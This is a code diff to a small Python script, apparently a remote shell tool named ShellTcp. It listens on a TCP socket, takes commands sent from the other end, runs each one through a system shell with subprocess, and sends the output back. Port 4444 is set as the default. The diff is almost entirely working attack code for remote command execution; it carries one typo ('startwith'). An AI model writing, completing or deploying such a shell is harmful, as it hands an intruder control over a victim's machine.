@@ -4,12 +4,15 @@ from time import sleep
 import subprocess
 from colorama import init, Fore 
 
+host = "127.0.0.1"
+port = 4444
 init(autoreset=True)
 class ShellTcp:
   def __init__(self, host, port):
     self.host = host
     self.port = port
     self.socket = None
+    self.data = None
   def servidor(self):
     try:
       self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,5 +20,42 @@ class ShellTcp:
     except Exception as e:
       print(f"erro {e}")
   def listen(self):
-    data = self.socket.
-    
+    while True:
+      try:
+        self.data = self.socket.recv(1024).decode().strip()
+        if self.data == "/exit":
+          return
+        if self.data == "/clear":
+          os.system("clear")
+        else:
+          self.cmd(self.socket, self.data)
+      except Exception as e:
+        print(f"error {e}")
+  def cmd(self, server, data):
+    try:
+      if data.startwith("cd "):
+        os.chdir(data [3:].strip())
+        return
+      p = subprocess.Popen(
+        data,
+        shell=True,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+      )
+      server.send(
+        p.stdout.read() + p.stderr.read() + b"\n"
+      )
+    except Exception as e:
+      print(f"error {e}")
+      return
+
+if __name__ == "__main__":
+  user = ShellTcp(host, port)
+  while True:
+    try:
+      user.servidor()
+      user.listen()
+    except Exception as e:
+      print(f"error {e}")
+      sleep(0.5)
